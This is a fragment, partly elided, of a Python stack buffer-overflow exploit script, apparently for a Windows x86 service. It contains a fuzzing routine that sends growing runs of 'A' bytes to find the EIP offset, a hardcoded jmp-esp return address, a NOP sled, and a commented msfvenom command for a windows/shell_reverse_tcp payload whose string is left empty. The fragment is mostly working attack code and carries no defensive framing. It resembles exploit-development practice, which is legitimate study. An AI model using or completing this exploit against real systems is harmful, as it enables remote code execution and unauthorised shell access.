...
#jmp esp pointer addresses -> 
eip = b"\xbf\x16\x04\x08"
#eip = b'ABCD'

#payload windows/shell_reverse_tcp -a x86 --platform windows -b "\x00" -e x86/shikata_ga_nai -f c
payload= ""

padding = b'\x90'*20

buffer = junk + eip + padding + payload
...
#Roughly detects how many bytes are needed to overwrite the EIP
def get_crash():
        junk = b"A"*100
        ...
        for i in range(1,100):
                ...
                print(data)
                time.sleep(0.5)
                print(f"It worked with {i*100} bytes!!!")
                junk = junk + b'A'*100
